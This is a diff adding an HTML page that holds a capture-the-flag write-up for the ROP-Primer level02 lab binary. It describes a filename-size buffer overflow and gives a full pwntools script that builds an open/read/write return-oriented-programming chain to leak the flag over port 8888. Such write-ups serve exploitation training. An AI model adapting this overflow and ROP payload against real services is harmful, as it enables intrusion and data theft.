@@ -1,0 +1,134 @@
+<html>
+ <head>
+<title> ROP 2  </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> ROP-2 </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> ROP-PRIMER level02 </h1>
+   
+ <br> 
+
+<p> This problem has to exploited remotely I used strace to find what binary is doing and then i came to know it was calling htons(8888,,,,) so the port is 8888 <br> 
+    so i did nc localhost 8888 . So it was having a 2 cmd's  1.Read,Store . The Store cmd especially the file-name   had a vulnerability  it was using <br>
+    filesize as filename size  so we can overflow it . So then i found eip offset to be 64 then it's time to find a gadget and exploit the binary so i <br>
+  searched for "flag" string in the binary luckily i had one  then used open() function to open the flag then read() that into a bss section and finally write it <br>
+  to the socket using write() <br> <br>  </p>
+<p><b> NOTE : to find the file discriptor use ltrace -f ./level01 (f for fork mode ) so i got 3 -- for file descriptor && 4 for socket discriptor </b></p>
+
+<br><br>  
+
+<code> 
+
+from pwn import *
+
+flag=0x804a128
+open_flag=0xf7ed3230
+read_flag=0xf7ed3710
+write_flag=0xf7ed3790
+pop2ret=0x8048ef7
+pop3ret=0x8048ef6
+bss=0x0804a000
+
+payload="A"*64
+payload+=pack(open_flag)+pack(pop2ret)+pack(flag)+pack(0)
+payload+=pack(read_flag)+pack(pop3ret)+pack(3)+pack(bss)+pack(32)
+payload+=pack(write_flag)+pack(0xdeadbeef)+pack(4)+pack(bss)
+
+
+p=process('level1')
+
+r=remote('127.0.0.1',8888)
+
+msg=r.recvuntil('>')
+
+print msg
+
+r.sendline('store\n')
+
+msg=r.recvuntil('>')
+
+print msg
+
+r.sendline('500\n')
+
+msg=r.recvuntil('>')
+
+print msg
+
+
+r.sendline('Hello world\n')
+
+
+msg=r.recvuntil('>')
+
+print msg
+
+
+r.sendline(payload+"\n")
+
+msg=r.recvlines(10) # or u can try giving p.revuntil('}')
+print msg 
+
+ </code>
+
+</body>
+</html>
